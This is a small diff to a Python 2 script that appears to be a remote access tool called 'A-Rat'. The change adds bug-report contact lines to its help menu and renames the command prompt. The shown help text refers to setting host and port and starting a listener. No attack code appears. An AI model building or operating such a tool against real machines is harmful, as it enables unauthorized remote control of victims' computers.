@@ -34,12 +34,15 @@ def help():
        show values    : Show Host, Port And Output Value
        start listener : Start Your Conection Server 
 
+  Please Report This bug To My FB
+  FB : https://m.facebook.com/
+  FP : https://m.facebook.com/\n""")
        
 def main():
     global host, port, output
 
     while True:
-        cmd = raw_input("[*] A-Rat@CVKR:~# ").lower()
+        cmd = raw_input("[*] A-RAT@CEHCVKR:~# ").lower()
 
         if cmd == "help":
             help()
